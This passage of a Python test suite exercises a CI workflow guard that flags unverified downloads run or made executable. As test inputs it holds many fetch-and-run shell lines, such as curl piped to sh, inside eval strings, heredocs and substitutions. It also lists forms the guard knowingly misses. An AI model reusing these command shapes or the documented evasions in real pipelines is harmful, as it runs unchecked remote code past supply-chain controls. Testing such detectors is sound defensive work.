    PLACES = ("shell branch", "case arm", "loop", "if: step")
    # (where the download lands, a use the follow-ups taught the guard to
    # read, the use after it that nothing guards)
    USES = (("tool", '"$PWD/tool" --version', "./tool"),                      # #2310
            ("/usr/local/bin/tool", "tool --version", "/usr/local/bin/tool"),  # #2308
            ("tool", "env x-y=1 ./tool --version", "./tool"),                 # #2307
            ("tool", "sh <<< './tool --version'", "./tool"))                  # #2293

    def job(self, place, dest, inside, after):
        fetch = "curl -fsSL -o %s %s\n" % (dest, self.URL)
        body = self.CHECK % dest + (inside + "\n" if inside else "")
        if place == "if: step":
            return [wg.Step("get", fetch), wg.Step("check", body, None, "env.X == 'y'"),
                    wg.Step("run", after + "\n")]
        opened, closed = {"shell branch": ('if [ -n "$X" ]; then\n', "fi\n"),
                          "case arm": ('case "$X" in\na)\n', ";;\nesac\n"),
                          "loop": ("for f in $X; do\n", "done\n")}[place]
        return [("step", fetch + opened + body + closed + after + "\n")]

    def assertReported(self, place, found):
        self.assertEqual(1, len(found), found)
        self.assertIn(wg._UNSHARED_IF if place == "if: step" else wg._UNSHARED_BRANCH,
                      found[0][1])

    def test_a_use_the_checksum_guards_does_not_clear_one_after_it(self):
        for place in self.PLACES:
            for dest, inside, after in self.USES:
                with self.subTest(place=place, inside=inside):
                    self.assertReported(place, wg.job_defects(self.job(place, dest, inside, after)))

    def test_nor_does_a_use_the_guard_always_read(self):
        # The same weakness with a use the guard read before the follow-ups:
        # base read these clean as well.
        for place in self.PLACES:
            with self.subTest(place=place):
                self.assertReported(place, wg.job_defects(
                    self.job(place, "tool", "./tool --version", "./tool")))

    def test_without_the_use_inside_it_is_reported_as_before(self):
        # The must-trip control: reported on every tree.
        for place in self.PLACES:
            for dest, _inside, after in self.USES:
                with self.subTest(place=place, after=after):
                    self.assertReported(place, wg.job_defects(self.job(place, dest, None, after)))

    def test_a_checksum_before_every_use_still_clears_them_all(self):
        for dest, inside, after in self.USES:
            script = ("curl -fsSL -o %s %s\n" % (dest, self.URL) + self.CHECK % dest +
                      'if [ -n "$X" ]; then\n%s\nfi\n%s\n' % (inside, after))
            with self.subTest(inside=inside):
                self.assertEqual([], wg.job_defects([("step", script)]))


class TestAnUnparseableShellIsNotAPass(unittest.TestCase):
    """L1: the parser reads sh/bash. A step that runs pwsh, python or cmd is
    not clean, it is UNREAD -- and saying so is the only honest answer."""

    def test_a_pwsh_step_is_reported(self):
        found = wg.job_defects([wg.Step("install", "Invoke-WebRequest x", "pwsh")])
        self.assertEqual(1, len(found), found)
        self.assertIn("pwsh", found[0][1])

    def test_a_python_step_is_reported(self):
        found = wg.job_defects([wg.Step("install", "import urllib", "python")])
        self.assertIn("python", found[0][1])

    def test_bash_and_sh_are_parsed(self):
        for shell in ("bash", "sh", "bash -e {0}", None):
            self.assertEqual([], wg.job_defects([wg.Step("x", "make test\n", shell)]),
                             shell)

    def test_the_effective_shell_comes_from_the_document(self):
        doc = {"defaults": {"run": {"shell": "pwsh"}},
               "jobs": {"b": {"steps": [{"name": "s", "run": "echo hi"}]}}}
        self.assertEqual([("b", [wg.Step("s", "echo hi", "pwsh")])],
                         wg.run_jobs(doc))

    def test_a_job_default_shell_beats_the_workflow_default(self):
        doc = {"defaults": {"run": {"shell": "pwsh"}},
               "jobs": {"b": {"defaults": {"run": {"shell": "bash"}},
                              "steps": [{"run": "echo hi", "shell": "sh"}]}}}
        self.assertEqual("sh", wg.run_jobs(doc)[0][1][0].shell)


# --- #1697: the documented gap list, as executable pins -----------------------
# The module docstring names ten forms this guard does not model. A list of
# fail-open forms written only in prose ROTS: a form that starts being caught
# keeps its entry, a form that stops being caught gains none, and either way
# the list stops describing the control. So each of the ten runs here, through
# `job_defects`, in the smallest step that spells it -- and the assertion is
# the current answer, whatever that answer is.
#
# Every one of them was accepted when this class was written. #1697 then ruled
# each by REACHABILITY: four were reachable and are CLOSED, so their pin is
# `flagged`; six keep their entry in the docstring with the reason they keep
# it, so their pin is `accepted` -- the fail-open state said out loud, where a
# change that starts catching one has to come and edit it.


class TestTheGapsTheGuardDocuments(unittest.TestCase):
    """#1697: the ten forms the module docstring ruled, each as a live step,
    and an eleventh ruled since (#2308)."""

    def accepted(self, *steps):
        """The job is clean -- this form goes unseen, and says so out loud."""
        found = wg.job_defects(list(steps))
        self.assertEqual([], found, found)

    def flagged(self, *steps):
        """The form was ruled reachable and the guard now reports it."""
        found = wg.job_defects(list(steps))
        self.assertEqual(1, len(found), found)
        return found[0][1]

    # 1. a fetcher that is not curl/wget.
    def test_a_fetcher_that_is_not_curl_or_wget(self):
        for fetch in ("gh release download v1.2.3 -O /tmp/payload\n",
                      "aws s3 cp s3://bucket/payload /tmp/payload\n"):
            self.accepted(("get", fetch), ("run", "chmod +x /tmp/payload\n"))

    # 2. variable expansion: the same file under two spellings.
    def test_a_destination_spelled_one_way_and_used_another(self):
        self.accepted(("get", 'DEST=/tmp/payload\n'
                              'curl -sfL https://example.test/p -o "$DEST"\n'),
                      ("run", "chmod +x /tmp/payload\n/tmp/payload\n"))

    def test_a_use_spelled_another_way_off_the_command_word(self):
        # #2310 closed a command word with a `$` ending in the download's
        # basename (`TestADownloadRunThroughAnExpandedPath`), and #2345 an
        # operand (`TestADollarSpelledPathOnEitherSideBindsByItsLastPart`); a
        # word whose last part expands and a tilde still name nothing fetched.
        fetch = ("get", "curl -sfL https://example.test/p -o payload\n")
        for run in ('P=./payload\n"$P" 9\n', 'P=./payload\nsh "$P"\n', "~/payload 9\n"):
            with self.subTest(run=run):
                self.accepted(fetch, ("run", run))
        for run in ('"$PWD/payload" 9\n', 'sh "$PWD/payload"\n'):
            with self.subTest(run=run):
                self.flagged(fetch, ("run", run))

    def test_a_download_carried_in_a_variable_beyond_the_shape_that_is_read(self):
        # #2341 follows `x=$(curl ...)` to a shell whole, or a whole copy of it
        # (`TestADownloadCarriedInAVariable`); through a cut, a command or a
        # file, it is a value the guard does not follow.
        get = "x=$(curl -fsSL https://example.test/i.sh)\n"
        for run in (get + 'eval "${x%%#*}"\n', get + 'echo "$x" > f\nsh f\n',
                    get + 'y=$(echo "$x")\neval "$y"\n',
                    "x=$(curl -fsSL https://example.test/i.sh | tr -d '\\r')\neval \"$x\"\n"):
            with self.subTest(run=run):
                self.accepted(("run", run))
        self.flagged(("run", get + 'eval "$x"\n'))

    # Grouping parentheses are read with or without surrounding whitespace.
    def test_a_fetch_at_the_head_of_a_tight_subshell_is_read(self):
        tight = "(curl -sfL https://example.test/payload -o /tmp/payload || true)\n"
        self.assertEqual(1, len(wg.fetches(tight)), wg.fetches(tight))
        self.flagged(("get", tight), ("run", "chmod +x /tmp/payload\n"))

    def test_the_same_subshell_with_a_space_is_read(self):
        spaced = "( curl -sfL https://example.test/payload -o /tmp/payload || true )\n"
        self.assertEqual(1, len(wg.fetches(spaced)), wg.fetches(spaced))
        self.flagged(("get", spaced), ("run", "chmod +x /tmp/payload\n"))

    def test_nested_grouping_and_case_alternatives_keep_the_fetch(self):
        for script in (
                "( (curl -sfL https://example.test/payload -o /tmp/payload))\n",
                "(case x in x|y) (curl -sfL https://example.test/payload -o /tmp/payload);; esac)\n",
                "case x in (x|y) (curl -sfL https://example.test/payload -o /tmp/payload);; esac\n"):
            with self.subTest(script=script):
                self.assertEqual(1, len(wg.fetches(script)))
                self.flagged(("get", script), ("run", "chmod +x /tmp/payload\n"))

    def test_quoted_and_escaped_parentheses_stay_literal(self):
        for script in ('echo "(curl -sfL https://example.test/x)"\n',
                       r'\(curl -sfL https://example.test/x\)' + '\n'):
            with self.subTest(script=script):
                self.assertEqual([], wg.fetches(script))
        fetch = wg.fetches('(curl -sfL "https://example.test/(payload)" -o /tmp/payload)')[0]
        self.assertEqual(fetch.url, "https://example.test/(payload)")
        self.assertEqual(fetch.dest, "/tmp/payload")

    # 3. what runs inside a container. CLOSED for the shape the fleet can
    # reach -- a bind mount and an interpreter operand -- because the reader
    # already yields that argv. Mounts are NOT modelled: the binding is by
    # basename, which is the only name the bytes have on the far side.
    def test_a_container_running_the_download_under_a_shell(self):
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                     ("run", "docker run --rm -v /tmp:/w img bash /w/x.sh\n"))

    def test_a_podman_run_counts_the_same(self):
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                     ("run", "podman run --rm -v /tmp:/w img sh /w/x.sh\n"))

    def test_a_container_running_another_file_is_left_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker run --rm -v /tmp:/w img bash /w/other.sh\n"))

    def test_a_verified_download_may_be_run_in_a_container(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("check", 'echo "%s  /tmp/x.sh" | sha256sum -c -\n' % HEX),
                      ("run", "docker run --rm -v /tmp:/w img bash /w/x.sh\n"))

    def test_a_docker_build_is_not_a_container_run(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker build -f x.sh .\n"))

    # The three shapes the container entry still names as unread, each one a
    # pin so the docstring cannot drift from what the code does.
    def test_a_file_renamed_by_the_mount_is_unread(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker run --rm -v /tmp/x.sh:/w/y.sh img "
                              "bash /w/y.sh\n"))

    def test_an_argument_the_entrypoint_supplies_is_unread(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker run --rm -v /tmp:/w img\n"))

    def test_what_the_image_runs_on_its_own_is_unread(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker run --rm -v /tmp:/w img /w/x.sh\n"))

    def test_the_fleets_own_container_line_is_still_clean(self):
        # adapter-integration.yml's shape, which fetches nothing: the scan must
        # not invent a use out of an `--entrypoint sh` and an image name.
        self.accepted(("run", 'docker run --rm -v "$PWD:/work:ro" -w /work '
                              "--entrypoint sh panopticon-fixtures:latest "
                              '-c "python3 -m pytest tests/tools/ -q"\n'))

    # 4. bytes modified after a passing check.
    def test_bytes_modified_after_a_passing_check(self):
        self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                      ("check", 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX),
                      ("run", "sed -i s/a/b/ /tmp/p\nchmod +x /tmp/p\n/tmp/p\n"))

    # 5. a chmod over a glob -- and over a directory, which is the same act.
    # CLOSED: ordinary bash, and the fleet writes both spellings
    # (`chmod -R a+rX odc-data` in nvd-cache.yml, `find ... | xargs` in both
    # Dockerfiles). A glob names nothing, but it DESIGNATES the download.
    def test_a_chmod_over_a_glob_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                     ("run", "chmod +x /tmp/d/*.sh\n"))

    def test_a_recursive_chmod_over_the_directory_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                     ("run", "chmod -R +x /tmp/d\n"))

    def test_a_recursive_chmod_over_the_root_is_the_widest_of_all(self):
        # `os.path.normpath("/")` is `/`, so the prefix test asked whether the
        # path starts with `//`: the single widest spelling bound nothing.
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                     ("run", "chmod -R +x /\n"))

    def test_a_recursive_chmod_over_the_root_leaves_a_relative_file_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o x.sh\n"),
                      ("run", "chmod -R +x /\n"))

    def test_a_glob_that_does_not_match_the_download_is_left_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                      ("run", "chmod +x /tmp/d/*.py\n"))

    def test_a_recursive_chmod_over_another_directory_is_left_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                      ("run", "chmod -R +x /tmp/e\n"))

    def test_a_glob_bound_download_can_still_be_cleared(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                      ("check", 'echo "%s  /tmp/d/x.sh" | sha256sum -c -\n' % HEX),
                      ("run", "chmod +x /tmp/d/*.sh\n"))

    # 6. a fetch inside an `eval` STRING (not a substitution). CLOSED: the
    # string is shell, and this module reads shell -- the quotes are not a
    # grammar it lacks, only one it was not looking through.
    def test_a_fetch_inside_an_eval_string(self):
        self.flagged(("get", 'eval "curl -sfL https://example.test/p -o /tmp/p"\n'),
                     ("run", "chmod +x /tmp/p\n/tmp/p\n"))

    def test_a_fetch_inside_a_sh_dash_c_string(self):
        self.flagged(("get", 'sh -c "curl -sfL https://example.test/p -o /tmp/p"\n'),
                     ("run", "chmod +x /tmp/p\n/tmp/p\n"))

    def test_a_clustered_c_flag_is_still_a_script(self):
        # `sh -ec`, `bash -lc`, `bash -euc`: the ordinary CI idiom, not an
        # obfuscation. A short-option cluster carrying `c` IS `-c`.
        for opener in ("sh -ec", "bash -lc", "bash -euc", "bash -x -c"):
            self.flagged(("get", '%s "curl -sfL https://example.test/p '
                                 '-o /tmp/p"\n' % opener),
                         ("run", "chmod +x /tmp/p\n/tmp/p\n"))

    def test_a_shell_flag_cluster_without_c_hands_over_no_script(self):
        self.accepted(("run", 'sh -eu "curl -sfL https://example.test/p '
                              '-o /tmp/p"\nchmod +x /tmp/p\n'))

    def test_a_fetch_and_its_use_both_inside_the_string(self):
        self.flagged(("run", 'eval "curl -sfL https://example.test/p -o /tmp/p; '
                             'chmod +x /tmp/p"\n'))

    def test_a_checksum_inside_the_string_still_clears_it(self):
        # The expansion keeps the ORDER, so a step hardened inside its own
        # quoted script is read as hardened rather than as unread -- where
        # the checksum stops the script: under `sh -ec`, and not under a bare
        # `sh -c`, which carries on to the `chmod` (review I-2).
        script = ('sh -%s "curl -sfL https://example.test/p -o /tmp/p; '
                  'echo %s  /tmp/p | sha256sum -c -; chmod +x /tmp/p"\n')
        self.accepted(("run", script % ("ec", HEX)))
        self.assertIn("carries on past its failure", self.flagged(("run", script % ("c", HEX))))

    def test_a_pipe_to_a_shell_inside_the_string_is_still_a_pipe_to_a_shell(self):
        self.flagged(("run", 'eval "curl -sfL https://example.test/i.sh | sh"\n'))

    def test_a_string_that_fetches_nothing_is_left_alone(self):
        self.accepted(("run", 'sh -c "echo hello; /usr/bin/true"\n'))

    # 7. an executor that reads the file by convention, not by argument.
    def test_an_executor_that_reads_the_file_by_convention(self):
        self.accepted(("get", "curl -sfL https://example.test/m -o Makefile\n"),
                      ("run", "make\n"))
        self.accepted(("get", "curl -sfL https://example.test/p -o package.json\n"),
                      ("run", "npm install\n"))

    # 8. a digest computed from the download itself.
    def test_a_digest_computed_from_the_download_itself(self):
        self.accepted(
            ("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
            ("check", 'SHA="$(sha256sum /tmp/p | cut -d\' \' -f1)"\n'
                      'echo "$SHA  /tmp/p" | sha256sum -c -\n'),
            ("run", "chmod +x /tmp/p\n/tmp/p\n"))

    def test_a_sums_file_the_step_computed_from_the_download_is_already_caught(self):
        # The other spelling of the same theatre, and this half is NOT a gap:
        # the recorded text is `sha256sum /tmp/p`, which carries no digest.
        found = wg.job_defects(
            [("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
             ("check", "sha256sum /tmp/p > /tmp/p.sha\nsha256sum -c /tmp/p.sha\n"),
             ("run", "chmod +x /tmp/p\n")])
        self.assertEqual(1, len(found), found)

    # 9. `find -exec` and `xargs` operands. CLOSED with 5: the same act, the
    # operand describing the file instead of naming it.
    def test_a_find_exec_operand_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                     ("run", r"find /tmp -name p -exec chmod +x {} \;" "\n"))

    def test_an_xargs_operand_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                     ("run", "echo /tmp/p | xargs chmod +x\n"))

    def test_a_find_piped_into_xargs_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                     ("run", "find /tmp -name p | xargs chmod +x\n"))

    def test_a_stage_that_merely_names_xargs_inherits_nothing(self):
        # `xargs` counts where it stands IN FRONT of the command, which is
        # where `command()` strips it. A file that happens to be called
        # `xargs` is an operand, and operands hand nothing over.
        self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                      ("run", "echo /tmp/p | chmod +x xargs\n"))

    def test_an_option_before_the_starting_point_still_walks_it(self):
        # `-H`/`-L`/`-P` precede the starting points and are not predicates;
        # reading one as "no roots" reopens the form.
        for option in ("-H", "-L", "-P"):
            self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                         ("run", r"find %s /tmp -name p -exec chmod +x {} \;"
                                 % option + "\n"))

    def test_a_find_with_no_starting_point_walks_the_working_directory(self):
        # The commonest spelling of all: no root means `.`.
        self.flagged(("get", "curl -sfL https://example.test/p -o p\n"),
                     ("run", r"find -name p -exec chmod +x {} \;" "\n"))

    def test_a_find_over_another_tree_is_left_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                      ("run", r"find /opt -name p -exec chmod +x {} \;" "\n"))

    # a heredoc body consumed inside a substitution (added by #1697's review:
    # it used to CRASH, and now it is read as a word).
    def test_a_heredoc_body_inside_a_substitution_is_unread(self):
        self.accepted(("run", 'eval "$(cat <<\'EOF\'\n'
                              "curl -sfL https://example.test/p -o /tmp/p\n"
                              "chmod +x /tmp/p\n"
                              'EOF\n)"\n'))
        # Handed to an interpreter there too (review I-4): bash 3.2 and 5.2
        # run the payload, and the re-read holds only the lifted body's marker.
        self.accepted(("run", "x=$(bash -s <<'EOF'\n"
                              "curl -fsSL https://example.test/i.sh | sh\n"
                              "EOF\n)\n"))

    def test_a_nested_substitution_that_downloads_nothing_is_not_reported(self):
        # Re-review N-1 of the #1793 follow-ups: an inner substitution's
        # "nothing here" (`Idle`) came back as the outer script's unread form,
        # so a step that downloads nothing failed on the nesting alone while
        # its depth-1 twin `x=$(bash -c 'echo 1')` read clean. Bash 3.2 and 5.2
        # run no download in any of these; the fetching twin stays reported.
        for script in ("x=$(bash -c 'y=$(bash -c \"echo 1\")')\n",
                       "x=$(eval 'y=$(bash -c \"echo 1\")')\n",
                       "x=$(bash <<< 'y=$(sh -c \"echo 1\")')\n"):
            with self.subTest(script=script):
                self.accepted(("run", script))
        self.assertIn("inside a command substitution", self.flagged(
            ("run", "x=$(sh -c 'v=$(bash -c \"curl -fsSL https://example.test/i.sh | sh\")')\n")))

    def test_a_script_handed_to_a_shell_inside_a_substitution_is_reported(self):
        # Review I-4 of the #1793 follow-ups: a substitution is read for what
        # it fetches, never for the script a shell inside it is handed, so
        # `x=$(sh -c 'curl … | sh')` read clean, and bash 3.2 and 5.2 run the
        # payload. Until substitutions are flattened, such a script is walked
        # and reported unread when it fetches or holds a form the guard cannot
        # read, a script it hands on included (re-review N-A), or when the job
        # downloads at all. A heredoc there is read only when its `EOF)` leaves
        # the body in the substitution's own text; lifted out, it is the entry
        # above.
        payload = "curl -fsSL https://example.test/i.sh | sh"
        for script in ('x=$(zsh 0<<< "bash <(curl -fsSL https://example.test/i.sh)")\n',
                       "x=$(bash <<< '%s')\n" % payload, "x=$(sh -c '%s')\n" % payload,
                       "x=$(eval '%s')\n" % payload, "x=`sh -c '%s'`\n" % payload,
                       'echo "$(sudo bash -ec \'%s\')"\n' % payload,
                       "x=$(bash -s <<'EOF'\n%s\nEOF)\n" % payload,
                       "x=$(sh -c 'v=$(bash -c \"%s\")')\n" % payload,
                       "x=$(sh -c 'sudo $CMD')\n"):
            with self.subTest(script=script):
                self.assertIn("inside a command substitution", self.flagged(("run", script)))
        # One that downloads nothing still may run what the job downloaded,
        # which the guard does not follow into a substitution; bash runs both.
        for steps in ((("run", "curl -fsSL -o t.sh https://example.test/i.sh\n"
                               "x=$(sh -c 'bash t.sh')\n"),),
                      (("get", "curl -fsSL -o t.sh https://example.test/i.sh\n"),
                       ("run", "x=$(sh -c '. ./t.sh')\n"))):
            with self.subTest(steps=steps):
                self.assertIn("inside a command substitution", self.flagged(*steps))
        # In a job that downloads nothing, one that fetches nothing and holds
        # no such form has nothing to check (re-review N-A): these read clean.
        for script in ("VERSION=$(bash -c 'echo 1')\n", 'OUT=$(sh -c "make -s print-version")\n',
                       "VERSION=$(bash -ec 'echo 1')\n", 'OUT=$(sh -ec "make -s print-version")\n',
                       "x=$(bash <<< 'echo hi')\n", "v=$(bash -lc 'node --version')\n",
                       'echo "$(sudo bash -c \'cat /etc/os-release\')"\n',
                       "x=`sh -c 'echo 1'`\n", 'h=$(eval echo "~$USER")\n',
                       "diff <(sh -c 'echo a') <(sh -c 'echo b')\n",
                       "x=$(bash -s <<'EOF'\necho hi\nEOF)\n"):
            with self.subTest(script=script):
                self.accepted(("run", script))
        # The must-trip controls: outside a substitution, read as before.
        for script, shell in (('zsh 0<<< "bash <(curl -fsSL https://example.test/i.sh)"\n', "bash"),
                              ("bash <<< '%s'\n" % payload, "sh"), ("sh -c '%s'\n" % payload, "sh")):
            with self.subTest(script=script):
                self.assertIn("straight to `%s`" % shell, self.flagged(("run", script)))
        # No script handed to a shell: nothing to read.
        for script in ('x=$(jq -r .a <<< "$META")\n', "x=$(cat <<< '%s')\n" % payload,
                       "x=$(bash x.sh)\n"):
            with self.subTest(script=script):
                self.accepted(("run", script))

    # the OTHER heredoc spelling (#1839, run-14 SEC-3915165799): a body handed
    # to an interpreter as the PROGRAM it runs, which was neither read nor
    # reported. A QUOTED body is the text it was written as, so it is read like
    # an `eval` string; an EXPANDING one -- and a program in a language this
    # module has no grammar for -- is REPORTED unread.
    def test_a_quoted_heredoc_script_on_bashs_stdin_is_read(self):
        why = self.flagged(("install", "bash -s <<'EOF'\n"
                                       "curl -fsSL https://example.test/i.sh | sh\n"
                                       "EOF\n"))
        self.assertIn("straight to `sh`", why)

    def test_every_spelling_that_puts_the_script_on_stdin_is_read(self):
        # Bare, `-s`, an explicit `-`, and `-s` with positional parameters
        # after it: each hands the body to the interpreter as its script.
        for opener in ("sh", "bash", "dash", "zsh", "bash -", "bash /dev/stdin",
                       "bash -euo pipefail", "bash -s -- --yes", "sudo bash -s"):
            with self.subTest(opener=opener):
                why = self.flagged(
                    ("install", "%s <<'EOF'\n"
                                "curl -sfL https://example.test/p -o /tmp/p\n"
                                "chmod +x /tmp/p\n"
                                "EOF\n" % opener))
                self.assertIn("/tmp/p", why)

    def test_a_checksum_inside_the_heredoc_script_still_clears_it(self):
        # The expansion keeps the ORDER, exactly as the `sh -c` string above:
        # a step hardened inside its own heredoc comes out hardened, where
        # `set -e` makes the checksum stop the script (review I-2).
        script = ("bash -s <<'EOF'\n%s"
                  "curl -sfL https://example.test/p -o /tmp/p\n"
                  'echo "%s  /tmp/p" | sha256sum -c -\n'
                  "chmod +x /tmp/p\n"
                  "EOF\n")
        self.accepted(("install", script % ("set -euo pipefail\n", HEX)))
        self.assertIn("carries on past its failure",
                      self.flagged(("install", script % ("", HEX))))

    def test_an_expanding_heredoc_script_is_reported_unread(self):
        why = self.flagged(("install", "bash -s <<EOF\n"
                                       "curl -fsSL https://example.test/i.sh | sh\n"
                                       "EOF\n"))
        self.assertIn("EXPANDING", why)
        self.assertIn("bash", why)

    def test_a_heredoc_program_in_another_language_is_reported_unread(self):
        for opener in ("python3 -", "python3", "perl", "node"):
            with self.subTest(opener=opener):
                why = self.flagged(
                    ("install", "%s <<'EOF'\n"
                                "get('https://example.test/p', '/tmp/p')\n"
                                "EOF\n" % opener))
                self.assertIn(opener.split()[0], why)

    def test_a_clean_quoted_heredoc_script_is_neither_read_nor_reported(self):
        self.accepted(("install", "bash -s <<'EOF'\necho hello\nEOF\n"))

    def test_a_heredoc_that_is_a_programs_INPUT_is_not_its_script(self):
        # `bash x.sh <<'EOF'` feeds x.sh's standard input, and x.sh is a file
        # in the repo under review -- the author-deterministic ruling above.
        # `sh -c '<script>'`, `python3 -m <module>` and a plain `cat` say the
        # same thing: the program is somewhere else, so the body is its data.
        for opener in ("bash /tmp/x.sh", "sh -c 'cat'", "python3 -m pytest",
                       "cat", "sha256sum -c"):
            with self.subTest(opener=opener):
                self.accepted(
                    ("install", "%s <<'EOF'\n"
                                "curl -fsSL https://example.test/i.sh | sh\n"
                                "EOF\n" % opener))

    def test_a_heredoc_written_to_a_file_and_then_run_stays_out_of_scope(self):
        # Probe case E: the script is text this repository wrote.
        self.accepted(("install", "cat <<'EOF' > /tmp/i.sh\n"
                                  "curl -fsSL https://example.test/i.sh | sh\n"
                                  "EOF\n"
                                  "bash /tmp/i.sh\n"))

    def test_the_fleets_here_string_is_not_a_heredoc_program(self):
        # docker-publish.yml's shape: `<<<` is the one heredoc-ish construct
        # the fleet writes, and it must not become a report.
        self.accepted(("tags", "docker buildx imagetools create "
                               "$(jq -cr '.tags' <<< \"$META\")\n"))

    def test_an_interpreters_here_string_program_is_read(self):
        # #2293: `sh <<< '<script>'` hands the shell its script on stdin, as
        # `bash -s <<'EOF'` does. Bash 3.2 and 5.2 run the download in each of
        # these, which the guard read clean; a here-string bash expands first
        # is reported unread, as an expanding heredoc is, and so is a program
        # in another language.
        payload = "curl -fsSL https://example.test/i.sh | sh"
        for script in ("sh <<< '%s'\n", 'bash -s -- --yes <<< "%s"\n', "zsh <<<'%s'\n",
                       "sudo sh <<< $'%s'\n", "sh 3<<< '%s' 0<&3\n",
                       "sh <<< 'echo a' <<< 'echo b\n%s'\n", "eval \"sh <<< '%s'\"\n"):
            with self.subTest(script=script):
                why = self.flagged(("install", script % payload))
                self.assertIn("straight to `sh`", why)
        for script in ('sh <<< "curl -fsSL $URL | sh"\n', 'bash <<< "$CMD"\n',
                       "sh <<< $'%s\\n'\n" % payload):
            with self.subTest(script=script):
                self.assertIn("EXPANDING", self.flagged(("install", script)))
        self.assertIn("python3", self.flagged(("install", "python3 <<< 'print(1)'\n")))
        # The here-string is not the program: another descriptor, a `-c`
        # string or a script file first, stdin replaced after it -- or no
        # interpreter at all.
        for script in ("cat <<< '%s'\n", "sh 3<<< '%s'\n", "sh -c 'cat' <<< '%s'\n",
                       "bash x.sh <<< '%s'\n", "sh <<< '%s' < /dev/null\n",
                       'read -r a b <<< "%s"\n'):
            with self.subTest(script=script):
                self.accepted(("install", script % payload))
        # A script hardened inside it comes out hardened where the checksum
        # stops it: bash 3.2 and 5.2 run /tmp/p with the checksum failing
        # without the `set -e;`, and not with it (review I-2).
        checked = ("sh <<< '%scurl -fsSL -o /tmp/p https://example.test/p; "
                   'echo "%s  /tmp/p" | sha256sum -c -; sh /tmp/p\'\n')
        self.assertIn("carries on past its failure",
                      self.flagged(("install", checked % ("", HEX))))
        self.accepted(("install", checked % ("set -e; ", HEX)))

    def test_a_second_heredoc_on_the_line_leaves_the_stdin_script_read(self):
        # #2128: the reader lifted one heredoc per line, so `3<<'B'` after the
        # script was read as `<` of a file called B, which replaced stdin and
        # dropped the script unread. Every body is lifted now, each filed
        # under its own descriptor, in either order.
        for script in ("bash -s <<'A' 3<<'B'\n%s\nA\ndata\nB\n",
                       "bash -s 3<<'B' <<'A'\ndata\nB\n%s\nA\n"):
            with self.subTest(script=script):
                why = self.flagged(("install", script % (
                    "curl -fsSL https://example.test/i.sh | sh")))
                self.assertIn("straight to `sh`", why)

    def test_the_two_probe_controls_still_trip(self):
        self.flagged(("install", "curl -fsSL https://example.test/i.sh | sh\n"))
        self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                     ("run", "chmod +x /tmp/p\n"))

    # 10. the `if:` comparison, and its YAML twin of `|| true`.
    def test_a_check_step_carrying_continue_on_error(self):
        # `continue-on-error: true` is the YAML twin of `|| true`: the step
        # fails and the job carries on. Read through the document, because the
        # field is YAML the guard already has in hand.
        doc = {"jobs": {"b": {"steps": [
            {"name": "get", "run": "curl -sfL https://example.test/p -o /tmp/p\n"},
            {"name": "check", "continue-on-error": True,
             "run": 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX},
            {"name": "run", "run": "chmod +x /tmp/p\n/tmp/p\n"}]}}}
        self.flagged(*wg.run_steps(doc))

    def test_a_job_level_continue_on_error_reaches_every_step(self):
        doc = {"jobs": {"b": {"continue-on-error": True, "steps": [
            {"name": "get", "run": "curl -sfL https://example.test/p -o /tmp/p\n"},
            {"name": "check", "run": 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX},
            {"name": "run", "run": "chmod +x /tmp/p\n/tmp/p\n"}]}}}
        self.flagged(*wg.run_steps(doc))

    def test_a_check_step_without_it_still_clears_the_fetch(self):
        doc = {"jobs": {"b": {"steps": [
            {"name": "get", "run": "curl -sfL https://example.test/p -o /tmp/p\n"},
            {"name": "check", "continue-on-error": False,
             "run": 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX},
            {"name": "run", "run": "chmod +x /tmp/p\n/tmp/p\n"}]}}}
        self.accepted(*wg.run_steps(doc))

    def test_a_soft_step_still_counts_as_fetching(self):
        doc = {"jobs": {"b": {"steps": [
            {"name": "get", "continue-on-error": True,
             "run": "curl -sfL https://example.test/p -o /tmp/p\n"},
            {"name": "run", "run": "chmod +x /tmp/p\n/tmp/p\n"}]}}}
        self.flagged(*wg.run_steps(doc))

    def test_a_condition_compared_as_written_is_assumed_stable(self):
        # `env.NEED` is rewritten between the two steps, so the SAME text is
        # not the same answer -- but the guard compares the text.
        when = "env.NEED == 'yes'"
        self.accepted(
            wg.Step("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
